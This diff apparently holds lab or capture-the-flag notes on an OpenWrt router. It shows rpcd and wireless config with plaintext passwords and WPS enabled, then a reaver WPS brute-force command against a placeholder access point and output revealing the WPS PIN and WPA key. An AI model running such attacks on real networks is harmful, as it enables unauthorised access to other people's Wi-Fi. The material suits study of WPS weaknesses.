@@ -1,0 +1,26 @@
+etc/config/rpcd
+	option username 'root'
+	option password '$p$root'
+
+
+etc/config/wireless
+	config wifi-iface 'wifinet0'
+        option device 'radio0'
+        option mode 'ap'
+        option ssid 'OpenWrt'
+        option encryption 'psk'
+        option key 'VeRyUniUqWiFIPasswrd1!'
+        option wps_pushbutton '1'
+
+	config wifi-iface 'wifinet1'
+        option device 'radio1'
+        option mode 'sta'
+        option network 'wwan'
+        option ssid 'OpenWrt'
+        option encryption 'psk'
+        option key 'VeRyUniUqWiFIPasswrd1!'
+
+`reaver -i mon0 -b 02:00:00:00:00:00 -vv -c 1`
+	[+] WPS PIN: '12345670'
+	[+] WPA PSK: 'WhatIsRealAnDWhAtIsNot51121!'
+	[+] AP SSID: 'OpenWrt'
